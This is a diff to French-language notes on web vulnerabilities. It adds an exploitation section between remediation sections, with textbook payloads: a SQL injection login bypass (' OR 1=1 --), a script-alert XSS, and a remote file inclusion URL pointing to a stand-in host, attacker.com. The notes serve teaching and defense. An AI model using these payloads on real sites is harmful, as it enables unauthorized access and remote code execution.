@@ -31,6 +31,35 @@ Cela chargerait un fichier PHP malveillant depuis un serveur externe.
 - N'accepter que des fichiers locaux pour l'inclusion et les valider.
 - Utiliser une liste blanche de fichiers autorisés à inclure.
 
+**********************************************************************************************************************************************
+
+# Comment exploiter ces vulnérabilités
+## SQL Injection (SQLi)
+1) Exploitation simple :
+- Injecter une chaîne comme ' OR 1=1 -- dans un champ de formulaire comme username.
+- Cela modifie la requête SQL pour que la condition 1=1 soit toujours vraie, contournant la vérification du mot de passe.
+2) Exemple :
+- Sur une page de connexion, l'attaquant entre :
+    - username: ' OR 1=1 --
+    - password: (vide)
+- La requête SQL devient SELECT * FROM users WHERE username='' OR 1=1 --' AND password='', ce qui renvoie toujours un résultat.
+
+## XSS (Cross-Site Scripting)
+1) Exploitation simple :
+- Injecter un script JavaScript malveillant dans un champ vulnérable (comme un commentaire), qui sera ensuite exécuté dans le navigateur de l'utilisateur.
+2) Exemple :
+- Dans un champ de commentaire, l'attaquant entre: ```<script>alert('XSS')</script>```
+- Lorsque quelqu'un consulte la page, ce script est exécuté dans son navigateur, affichant l'alerte.
+
+## RFI (Remote File Inclusion)
+1) Exploitation simple :
+- Si le site inclut des fichiers via un paramètre comme include.php?file=page.txt, l'attaquant peut soumettre une URL externe pointant vers un fichier PHP malveillant.
+2) Exemple :
+- Si le site permet l'inclusion de fichiers, l'attaquant pourrait soumettre : ```http://attacker.com/malicious_file.php```
+- Cela chargerait un fichier PHP malveillant et l'exécuterait sur le serveur.
+
+**********************************************************************************************************************************************
+
 # Comment résoudre ces vulnérabilités
 ## SQL Injection (SQLi)
 1) Utiliser des requêtes préparées et des paramètres liés pour éviter l'injection.
